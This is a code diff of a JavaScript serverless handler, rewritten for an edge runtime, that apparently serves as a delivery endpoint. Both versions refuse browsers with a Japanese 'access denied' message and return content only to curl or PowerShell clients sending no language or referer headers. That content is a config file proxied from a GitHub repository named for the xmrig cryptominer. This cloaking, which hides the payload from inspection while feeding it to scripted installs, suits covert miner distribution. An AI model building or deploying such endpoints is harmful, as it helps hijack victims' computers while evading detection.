@@ -1,43 +1,14 @@
-export default async function handler(req, res) {
-  const ua = (req.headers['user-agent'] || '').toLowerCase();
-  const acceptLang = req.headers['accept-language'];
-  const referer = req.headers['referer'];
+export const config = { runtime: 'edge' };
 
-  const isCli =
-    (ua.includes('curl') || ua.includes('powershell')) &&
-    !acceptLang &&
-    !referer;
+const URL = 'https://raw.githubusercontent.com/5q0r/xmrig-shared/main/assets/config.json';
 
-  if (!isCli) {
-    return res.send('アクセスが拒否されました。');
-  }
+export default async function handler(req) {
+  const ua = (req.headers.get('user-agent')||'').toLowerCase();
+  if (req.headers.get('accept-language') || req.headers.get('referer') || (!ua.includes('curl') && !ua.includes('powershell')))
+    return new Response('アクセスが拒否されました。', { status: 403 });
 
-  const rawUrl =
-    'https://raw.githubusercontent.com/5q0r/xmrig-shared/refs/heads/main/assets/config.json';
+  const r = await fetch(URL, { cache: 'no-store' });
+  if (!r.ok) return new Response(`リモート取得失敗: HTTP ${r.status}`, { status: r.status });
 
-  try {
-    const controller = new AbortController();
-    const timeout = setTimeout(() => controller.abort(), 5000);
-
-    const response = await fetch(rawUrl, { signal: controller.signal });
-    clearTimeout(timeout);
-
-    if (!response.ok) {
-      return res
-        .status(502)
-        .json({ error: 'リモートファイルの取得に失敗しました', status: response.status });
-    }
-
-    const content = await response.text();
-
-    res.setHeader('Content-Type', 'application/json');
-    return res.status(200).send(content);
-  } catch (error) {
-    const message =
-      error.name === 'AbortError'
-        ? 'Upstream request timed out'
-        : 'Internal Server Error';
-
-    return res.status(500).json({ error: message });
-  }
+  return new Response(r.body, { headers: { 'Content-Type': 'application/json; charset=utf-8' } });
 }
